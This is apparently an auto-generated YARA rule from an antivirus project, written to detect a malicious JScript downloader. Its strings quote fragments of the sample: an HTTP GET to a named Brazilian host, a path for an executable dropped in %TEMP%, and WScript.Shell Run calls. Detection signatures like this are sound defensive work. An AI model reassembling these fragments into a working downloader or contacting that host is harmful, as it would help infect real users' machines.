rule sig_20160329_d8061f3dc92d1f352d0a29ec2c16024c {
  meta:
    description = "datamaliciousorder - file 20160329_d8061f3dc92d1f352d0a29ec2c16024c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "59cbeaa02564276ffcb54b8d375e1d637f82810d62cfb0a1b6fec04f710279f0"

  strings:
    $s1  = "e0[w](\"GET\", \"http://digimacro.com.br/m8isda\", false);" fullword ascii
    $s2  = "function g() {return SG[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"8N8YkNaMMU.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[x](C() * 11); if (e0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var SG = function ZW() {return WScript[r](\"WScript.Shell\");}(), e = 11;" fullword ascii
    $s5  = "function qx(B, Q){M = M * 1; return B - Q;};" fullword ascii
    $s6  = "function R(){return \"\" + f;};" fullword ascii
    $s7  = "function ys(Qc){SG[\"Run\"](Qc, M, M);};" fullword ascii
    $s8  = "function RR() {return ((km == true) && (km == lH)) ? 1 : M;};" fullword ascii
    $s9  = "function C(){return 22;};" fullword ascii
    $s10 = " while (k){" fullword ascii
    $s11 = "function C0(){return r;};" fullword ascii
    $s12 = "return qx(X, v);" fullword ascii
    $s13 = "function rX()" fullword ascii
    $s14 = "var aT = new this[\"Date\"]();" fullword ascii
    $s15 = "function u(DZ) {var Zq = (1, 2, 3, 4, 5, DZ); return Zq;};" fullword ascii
    $s16 = "var km = false;" fullword ascii
    $s17 = "var lH = false;" fullword ascii
    $s18 = "var Uw = false;" fullword ascii
    $s19 = "lH = true; " fullword ascii
    $s20 = "km = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}